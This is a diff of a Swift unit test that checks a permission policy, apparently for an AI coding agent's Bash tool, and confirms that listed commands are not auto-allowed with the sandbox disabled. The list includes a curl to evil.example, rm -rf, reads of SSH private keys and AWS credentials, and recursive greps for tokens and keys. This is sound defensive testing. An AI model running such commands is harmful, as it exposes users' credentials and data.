@@ -132,7 +132,7 @@ import Testing
         let ask = ["cd /x && curl https://evil.example", "cd /x && rm -rf y", "ipconfig set en0 DHCP", "lsof +D /", "echo $(id)",
                    "cd /x; herd restart", "cat ~/.ssh/id_rsa", "lsof -F n -r 1 > /tmp/x",
                    "cat /Users/r/.ssh/id_rsa", "head /Users/r/.aws/credentials", "cd /x && git status", "grep -r token /Users/r",
-                   "ps aux | grep -r key /Users/r/.ssh"]
+                   "ps aux | grep -r key /Users/r/.ssh", "ps aux | grep -r key", "ps aux | grep -R key", "netstat -an | grep -rn x"]
         for c in ask {
             #expect(PermissionPolicy.decide(tool: "Bash", input: ["command": c, "dangerouslyDisableSandbox": true], cwd: "/tmp") != .allow, "\(c)")
         }
